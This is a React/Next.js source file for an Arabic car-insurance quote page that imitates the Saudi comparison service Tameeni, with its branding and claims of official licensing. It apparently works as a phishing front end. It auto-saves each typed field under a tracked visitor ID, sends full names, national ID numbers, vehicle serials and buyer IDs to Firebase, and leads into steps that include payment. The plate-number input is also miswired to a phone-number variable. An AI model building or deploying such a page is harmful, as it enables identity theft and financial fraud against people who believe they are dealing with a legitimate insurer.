"use client";
import { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import { Input } from "@/components/ui/input";
import {
  getOrCreateVisitorID,
} from "@/lib/visitor-tracking";
import { addData } from "@/lib/firebase";
import { useAutoSave } from "@/hooks/use-auto-save";
import {
  Loader2, Car, ChevronDown, ChevronLeft,
  CreditCard, Hash, User, Smartphone,
  CheckCircle2, Globe, UserCircle,
  Phone, Mail, Star, BadgeCheck, Clock, HeadphonesIcon,
  ArrowLeft,
} from "lucide-react";
import { VehicleDropdownOption } from "@/lib/v-types";

function validateSaudiId(id: string): { valid: boolean; error: string } {
  const cleanId = id.replace(/\s/g, "");
  if (!/^\d{10}$/.test(cleanId)) return { valid: false, error: "رقم الهوية يجب أن يتكون من 10 أرقام" };
  if (!/^[12]/.test(cleanId)) return { valid: false, error: "رقم الهوية يجب أن يبدأ بـ 1 أو 2" };
  let sum = 0;
  for (let i = 0; i < 10; i++) {
    let digit = Number.parseInt(cleanId[i]);
    if ((10 - i) % 2 === 0) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
  }
  if (sum % 10 !== 0) return { valid: false, error: "رقم الهوية غير صحيح" };
  return { valid: true, error: "" };
}

const STEP_TABS = ["المركبات", "بيانات التأمين", "خيارات التغطية", "عروض شركات التأمين", "الدفع", "التقييم", "التحديث"];

export default function Home() {
  const router = useRouter();
  const [visitorID] = useState(() => getOrCreateVisitorID());
  const [identityNumber, setIdentityNumber] = useState("");
  const [ownerName, setOwnerName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [documentType, setDocumentType] = useState("استمارة");
  const [serialNumber, setSerialNumber] = useState("");
  const [insuranceType, setInsuranceType] = useState("تجديد استمارة");
  const [buyerName, setBuyerName] = useState("");
  const [buyerIdNumber, setBuyerIdNumber] = useState("");
  const [identityNumberError, setIdentityNumberError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [vehicleOptions, setVehicleOptions] = useState<VehicleDropdownOption[]>([]);
  const [isLoadingVehicles, setIsLoadingVehicles] = useState(false);
  const [selectedVehicle, setSelectedVehicle] = useState<VehicleDropdownOption | null>(null);
  const [serialFieldFocused, setSerialFieldFocused] = useState(false);
  const [visitorInitialized, setVisitorInitialized] = useState(false);

  useEffect(() => {
    if (!visitorID) return;
    setVisitorInitialized(true);
  }, [visitorID]);

  useAutoSave({
    visitorId: visitorInitialized ? visitorID : "",
    pageName: "home",
    data: { identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName, buyerIdNumber },
  });

  const fetchVehicles = useCallback(async (nin: string) => {
    if (!validateSaudiId(nin).valid) { setVehicleOptions([]); return; }
    setIsLoadingVehicles(true);
    setVehicleOptions([]);
    try {
      const res = await fetch(`/api/vehicles/${nin}`);
      const data = await res.json();
      if (data.success && data.vehicles?.length > 0) {
        const options: VehicleDropdownOption[] = data.vehicles.map((v: any) => ({
          value: v.sequenceNumber || v.SequenceNumber || String(v.vehicleId || ""),
          label: `${v.sequenceNumber || v.SequenceNumber || ""} - ${v.vehicleMaker || v.VehicleMaker || ""} ${v.vehicleModel || v.VehicleModel || ""} ${v.modelYear || v.ModelYear || ""}`.trim(),
          vehicle: v,
        }));
        setVehicleOptions(options);
        setSerialFieldFocused(true);
      }
    } catch (e) { console.error(e); } finally { setIsLoadingVehicles(false); }
  }, []);

  useEffect(() => {
    if (identityNumber.length === 10 && /^\d{10}$/.test(identityNumber)) fetchVehicles(identityNumber);
    else { setVehicleOptions([]); setSelectedVehicle(null); }
  }, [identityNumber, fetchVehicles]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const v = validateSaudiId(identityNumber);
    if (!v.valid) { setIdentityNumberError(v.error); return; }
    setSubmitting(true);
    try {
      localStorage.setItem("homeFormData", JSON.stringify({ identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName, buyerIdNumber, selectedVehicle, timestamp: new Date().toISOString() }));
      await addData({ id: visitorID, identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName: insuranceType === "نقل ملكية" ? buyerName : "", buyerIdNumber: insuranceType === "نقل ملكية" ? buyerIdNumber : "", selectedVehicle: selectedVehicle ? { value: selectedVehicle.value, label: selectedVehicle.label } : null, currentStep: 2, currentPage: "insur" });
    } catch (e) { console.error(e); }
    router.push("/insur");
  };

  return (
    <div className="min-h-screen bg-white" dir="rtl">

      {/* ── Announcement bar ─────────────────────────── */}
      <div className="bg-[#e8f0fe] border-b border-blue-100 py-1.5 px-3 text-center">
        <div className="max-w-5xl mx-auto flex items-center justify-between text-xs gap-2">
          <a href="#" className="hidden sm:flex items-center gap-1 text-[#1976d2] font-bold hover:underline shrink-0">
            <ChevronLeft className="h-3 w-3" />
            العروض الترويجية
          </a>
          <span className="text-slate-600 font-medium flex-1 text-center">منصة تأمين موثوقة ومرخصة رسمياً</span>
          <span className="hidden sm:block w-24" />
        </div>
      </div>

      {/* ── Header ─────────────────────────────────────── */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-50">
        <div className="max-w-5xl mx-auto flex items-center justify-between px-3 sm:px-4 py-2.5 sm:py-3">
          {/* Left: actions */}
          <div className="flex items-center gap-2">
            <UserCircle className="h-5 w-5 sm:h-6 sm:w-6 text-slate-400 cursor-pointer hover:text-[#1976d2] transition-colors" />
            <button className="text-xs font-semibold text-slate-500 hover:text-[#1976d2] transition-colors">
              English
            </button>
          </div>
          {/* Center: nav links */}
          <nav className="hidden sm:flex items-center gap-5 text-sm font-semibold">
            <a href="#" className="text-[#1976d2] border-b-2 border-[#1976d2] pb-0.5">الرئيسية</a>
          </nav>
          {/* Right: logo */}
          <div className="flex items-center gap-1.5 sm:gap-2 cursor-pointer">
            <span className="text-lg sm:text-xl font-black text-[#1976d2]">تأميني</span>
            <img src="/tameeni-logo.webp" alt="تأميني" className="h-8 w-8 sm:h-9 sm:w-9 rounded-xl" />
          </div>
        </div>
      </header>

      {/* ── Stats ribbon ─────────────────────────────── */}
      <div className="bg-[#1976d2] text-white py-2.5 px-3">
        <div className="max-w-5xl mx-auto flex items-center justify-center gap-5 sm:gap-16">
          {[
            { value: "100%", label: "مئات آلاف" },
            { value: "3", label: "دقائق فقط" },
            { value: "+25", label: "شركة تأمين" },
          ].map(({ value, label }) => (
            <div key={label} className="text-center">
              <p className="text-base sm:text-lg font-black leading-none">{value}</p>
              <p className="text-[10px] sm:text-[11px] text-blue-200 mt-0.5">{label}</p>
            </div>
          ))}
        </div>
      </div>

      {/* ── Page content ─────────────────────────────── */}
      <div className="max-w-5xl mx-auto px-3 sm:px-4 py-4 sm:py-8 space-y-4 sm:space-y-8">

        {/* Heading */}
        <div className="text-center space-y-1.5">
          <h1 className="text-xl sm:text-3xl font-black text-slate-800 leading-snug">
            احصل على أفضل عروض<br />
            <span className="text-[#1976d2]">تأمين السيارات</span>
          </h1>
          <p className="text-xs sm:text-sm text-slate-500">
            اتبع الخطوات البسيطة للحصول على أفضل عروض تأمين المركبة احتياجاتك
          </p>
        </div>

        {/* ── Form card ────────────────────────────────── */}
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">

          {/* Step tabs — horizontal scrollable */}
          <div className="border-b border-slate-200 overflow-x-auto">
            <div className="flex min-w-max">
              {STEP_TABS.map((tab, i) => (
                <div
                  key={tab}
                  className={`flex items-center gap-2 px-4 py-3 text-xs font-bold whitespace-nowrap border-b-2 transition-colors ${
                    i === 0
                      ? "border-[#1976d2] text-[#1976d2] bg-blue-50"
                      : "border-transparent text-slate-400"
                  }`}
                >
                  <span className={`flex h-5 w-5 items-center justify-center rounded-full text-[10px] font-black ${
                    i === 0 ? "bg-[#1976d2] text-white" : "bg-slate-200 text-slate-500"
                  }`}>{i + 1}</span>
                  {tab}
                </div>
              ))}
            </div>
          </div>

          <form onSubmit={handleSubmit} className="p-3.5 sm:p-6 space-y-4 sm:space-y-5">

            {/* Section title */}
            <div className="flex items-center gap-3">
              <div className="w-1 h-5 rounded-full bg-[#1976d2]" />
              <span className="text-sm font-black text-slate-700">البيانات الأساسية</span>
            </div>

            {/* Insurance type toggle */}
            <div className="grid grid-cols-2 gap-2">
              {["تجديد استمارة", "نقل ملكية"].map((type) => (
                <button
                  key={type}
                  type="button"
                  onClick={() => setInsuranceType(type)}
                  className={`py-2.5 rounded-xl text-sm font-bold border-2 transition-all ${
                    insuranceType === type
                      ? "border-[#1976d2] bg-[#1976d2] text-white shadow-sm"
                      : "border-slate-200 text-slate-500 bg-white hover:border-[#1976d2]/40"
                  }`}
                >
                  {type}
                </button>
              ))}
            </div>

            {/* Owner name */}
            <div className="space-y-1.5">
              <label className="block text-sm font-bold text-slate-700">اسم صاحب الهوية</label>
              <div className="relative">
                <User className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
                <Input
                  placeholder="الاسم الثلاثي كاملاً"
                  value={ownerName}
                  onChange={(e) => setOwnerName(e.target.value)}
                  className="h-11 rounded-xl border border-slate-300 focus:border-[#1976d2] text-sm text-right pr-10 bg-white"
                  dir="rtl"
                  required
                />
              </div>
            </div>

            {/* Identity number */}
            <div className="space-y-1.5">
              <label className="block text-sm font-bold text-slate-700">رقم الهوية / الإقامة</label>
              <div className="relative">
                <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
                <Input
                  type="tel"
                  inputMode="numeric"
                  placeholder="1xxxxxxxxx"
                  value={identityNumber}
                  onChange={(e) => {
                    setIdentityNumber(e.target.value.replace(/\D/g, "").slice(0, 10));
                    if (identityNumberError) setIdentityNumberError("");
                  }}
                  className={`h-11 rounded-xl border text-sm text-right pr-10 transition-all ${
                    identityNumberError
                      ? "border-red-400 bg-red-50"
                      : "border-slate-300 focus:border-[#1976d2] bg-white"
                  }`}
                  dir="rtl"
                  required
                />
                {isLoadingVehicles && (
                  <Loader2 className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 animate-spin text-[#1976d2]" />
                )}
                {identityNumber.length === 10 && !isLoadingVehicles && !identityNumberError && (
                  <CheckCircle2 className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-emerald-500" />
                )}
              </div>
              {identityNumberError && (
                <p className="text-xs text-red-600 font-medium">⚠ {identityNumberError}</p>
              )}
            </div>

            {/* Vehicle type / document type */}
            <div className="space-y-1.5">
              <label className="block text-sm font-bold text-slate-700">نوع المركبة</label>
              <div className="grid grid-cols-2 gap-2">
                {["استمارة", "بطاقة جمركية"].map((t) => (
                  <button
                    key={t}
                    type="button"
                    onClick={() => setDocumentType(t)}
                    className={`h-11 rounded-xl text-sm font-bold border transition-all ${
                      documentType === t
                        ? "border-[#1976d2] bg-[#1976d2] text-white"
                        : "border-slate-300 text-slate-500 bg-white hover:border-[#1976d2]/40"
                    }`}
                  >
                    {t}
                  </button>
                ))}
              </div>
            </div>

            {/* Serial + phone row */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div className="space-y-1.5">
                <label className="block text-xs font-bold text-slate-700">
                  {documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "رقم لوحة تسجيلية / عكسية"}
                </label>
                <div className="relative">
                  <Hash className="absolute right-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-400" />
                  <Input
                    type="tel"
                    inputMode="numeric"
                    placeholder="- - - - -"
                    value={phoneNumber}
                    onChange={(e) => { const c = e.target.value.replace(/\D/g, ""); setPhoneNumber(c.slice(0, 10)); }}
                    className="h-11 rounded-xl border border-slate-300 focus:border-[#1976d2] text-sm text-right pr-8"
                    dir="rtl"
                  />
                </div>
              </div>
              <div className="space-y-1.5">
                <label className="block text-xs font-bold text-slate-700">رقم الاستمارة</label>
                <div className="relative">
                  <Hash className="absolute right-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-400" />
                  <Input
                    type="tel"
                    inputMode="numeric"
                    placeholder="- - - - -"
                    value=""
                    readOnly
                    className="h-11 rounded-xl border border-slate-300 text-sm text-right pr-8 bg-slate-50"
                    dir="rtl"
                  />
                </div>
              </div>
            </div>

            {/* Serial number / vehicle lookup */}
            <div className="space-y-1.5">
              <label className="block text-sm font-bold text-slate-700">الرقم التسلسلي للمركبة</label>
              <div className="relative">
                <Hash className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
                <Input
                  type="tel"
                  inputMode="numeric"
                  placeholder={documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"}
                  value={serialNumber}
                  onChange={(e) => { setSerialNumber(e.target.value.replace(/\D/g, "")); setSelectedVehicle(null); }}
                  onFocus={() => { if (vehicleOptions.length > 0) setSerialFieldFocused(true); }}
                  onBlur={() => { setTimeout(() => setSerialFieldFocused(false), 200); }}
                  className="h-11 rounded-xl border border-slate-300 focus:border-[#1976d2] text-sm text-right pr-10 bg-white"
                  dir="rtl"
                  required
                />
                {vehicleOptions.length > 0 && !isLoadingVehicles && (
                  <button
                    type="button"
                    className="absolute left-3 top-1/2 -translate-y-1/2"
                    onClick={() => setSerialFieldFocused(!serialFieldFocused)}
                  >
                    <ChevronDown className={`h-4 w-4 text-[#1976d2] transition-transform ${serialFieldFocused ? "rotate-180" : ""}`} />
                  </button>
                )}
              </div>

              {selectedVehicle && !serialFieldFocused && (
                <div className="rounded-xl bg-emerald-50 border border-emerald-200 px-3.5 py-2.5">
                  <p className="text-[10px] text-emerald-600 font-bold mb-0.5">✓ المركبة المختارة</p>
                  <p className="text-sm font-semibold text-slate-700">{selectedVehicle.label}</p>
                </div>
              )}

              {serialFieldFocused && vehicleOptions.length > 0 && (
                <div className="absolute z-50 mt-1 w-[calc(100%-2rem)] rounded-2xl border border-slate-200 bg-white shadow-2xl overflow-hidden" dir="rtl">
                  <div className="max-h-52 overflow-y-auto divide-y divide-slate-50">
                    {vehicleOptions.map((opt) => (
                      <button
                        key={opt.value}
                        type="button"
                        className={`w-full px-4 py-3 text-right text-sm hover:bg-blue-50 transition-colors flex items-center justify-between ${serialNumber === opt.value ? "bg-blue-50 text-[#1976d2] font-bold" : "text-slate-700"}`}
                        onMouseDown={(e) => { e.preventDefault(); setSerialNumber(opt.value); setSelectedVehicle(opt); setSerialFieldFocused(false); }}
                      >
                        <span className="text-xs text-slate-400">{opt.value}</span>
                        <span>{opt.label}</span>
                      </button>
                    ))}
                  </div>
                  <button
                    type="button"
                    className="w-full px-4 py-2.5 text-center text-xs text-slate-400 hover:bg-slate-50 border-t border-slate-100 font-medium"
                    onMouseDown={(e) => { e.preventDefault(); setSerialFieldFocused(false); setSerialNumber(""); setSelectedVehicle(null); }}
                  >
                    إدخال رقم يدوياً
                  </button>
                </div>
              )}
            </div>

            {/* Transfer buyer fields */}
            {insuranceType === "نقل ملكية" && (
              <div className="space-y-3 bg-blue-50 border border-blue-200 rounded-xl p-4">
                <p className="text-xs font-bold text-blue-700">بيانات المشتري</p>
                <div className="relative">
                  <User className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
                  <Input
                    placeholder="اسم المشتري الكامل"
                    value={buyerName}
                    onChange={(e) => setBuyerName(e.target.value)}
                    className="h-11 rounded-xl border border-blue-200 focus:border-blue-400 text-sm text-right pr-10 bg-white"
                    dir="rtl"
                    required
                  />
                </div>
                <div className="relative">
                  <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
                  <Input
                    type="tel"
                    inputMode="numeric"
                    placeholder="رقم هوية المشتري"
                    value={buyerIdNumber}
                    onChange={(e) => setBuyerIdNumber(e.target.value.replace(/\D/g, "").slice(0, 10))}
                    className="h-11 rounded-xl border border-blue-200 focus:border-blue-400 text-sm text-right pr-10 bg-white"
                    dir="rtl"
                    required
                  />
                </div>
              </div>
            )}

            {/* Step indicator + Next button */}
            <div className="flex items-center justify-between pt-2 border-t border-slate-100">
              <button
                type="submit"
                disabled={submitting}
                className="flex items-center gap-2 bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-sm px-6 py-2.5 rounded-xl transition-colors disabled:opacity-70"
              >
                {submitting ? (
                  <Loader2 className="h-4 w-4 animate-spin" />
                ) : (
                  <ArrowLeft className="h-4 w-4" />
                )}
                التالي
              </button>
              <span className="text-xs text-slate-400 font-medium">
                الخطوة <span className="font-black text-slate-600">1</span> من {STEP_TABS.length}
              </span>
            </div>
          </form>
        </div>

        {/* ── Trust section ─────────────────────────────── */}
        <section className="bg-[#f5f7fa] rounded-2xl p-4 sm:p-6 space-y-4 sm:space-y-5">
          <h2 className="text-center text-base sm:text-lg font-black text-slate-800">
            لماذا يثق بنا أكثر من <span className="text-[#1976d2]">500,000</span> عميل؟
          </h2>
          <p className="text-center text-xs text-slate-500">
            نحن نقدم لكم خدمة تأمين السيارات تنافسية في المملكة العربية السعودية
          </p>
          <div className="grid grid-cols-2 gap-2 sm:gap-3">
            {[
              { icon: Star, title: "تقييم ممتاز", desc: "تقييم 4.9/5 من آلاف العملاء" },
              { icon: BadgeCheck, title: "أمان وثقة", desc: "مرخصة من الجهات المالية الرسمية" },
              { icon: HeadphonesIcon, title: "دعم مستمر", desc: "أكثر من 100,000 طلب بكل رضا" },
              { icon: Globe, title: "خبرة واسعة", desc: "+500,000 عميل في منطقة رائدة" },
            ].map(({ icon: Icon, title, desc }) => (
              <div key={title} className="bg-white rounded-xl p-3 sm:p-4 border border-slate-100 space-y-1.5 sm:space-y-2">
                <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-xl bg-blue-50 flex items-center justify-center">
                  <Icon className="h-4 w-4 text-[#1976d2]" />
                </div>
                <p className="text-xs sm:text-sm font-bold text-slate-700">{title}</p>
                <p className="text-[10px] sm:text-[11px] text-slate-500 leading-relaxed">{desc}</p>
              </div>
            ))}
          </div>
        </section>

        {/* ── Help CTA section ─────────────────────────── */}
        <section className="bg-[#1976d2] rounded-2xl p-4 sm:p-6 text-white text-center space-y-3 sm:space-y-4">
          <h2 className="text-base sm:text-lg font-black">هل تحتاج مساعدة؟</h2>
          <p className="text-xs sm:text-sm text-blue-100 leading-relaxed">
            فريق الخبراء جاهز لمساعدتك في اختيار أفضل تأمين للسيارات وتقديم الاستشارة المجانية
          </p>
          <div className="flex flex-row gap-2 sm:gap-3 justify-center">
            <a
              href="tel:920000000"
              className="flex items-center justify-center gap-1.5 bg-white text-[#1976d2] font-bold text-xs sm:text-sm px-4 sm:px-5 py-2 sm:py-2.5 rounded-xl hover:bg-blue-50 transition-colors"
            >
              <Phone className="h-3.5 w-3.5 sm:h-4 sm:w-4" />
              اتصل بنا
            </a>
            <a
              href="mailto:info@tameeni.com"
              className="flex items-center justify-center gap-1.5 bg-white/10 border border-white/30 text-white font-bold text-xs sm:text-sm px-4 sm:px-5 py-2 sm:py-2.5 rounded-xl hover:bg-white/20 transition-colors"
            >
              <Mail className="h-3.5 w-3.5 sm:h-4 sm:w-4" />
              راسلنا
            </a>
          </div>
          <div className="flex items-center justify-center gap-5 sm:gap-6 pt-1 sm:pt-2 text-xs text-blue-100">
            {[["98%", "رضا العملاء"], ["+30", "دقيقة"], ["24/7", "دعم"]].map(([v, l]) => (
              <div key={l} className="text-center">
                <p className="text-sm sm:text-base font-black text-white">{v}</p>
                <p className="text-[10px] text-blue-200">{l}</p>
              </div>
            ))}
          </div>
        </section>

      </div>

    </div>
  );
}
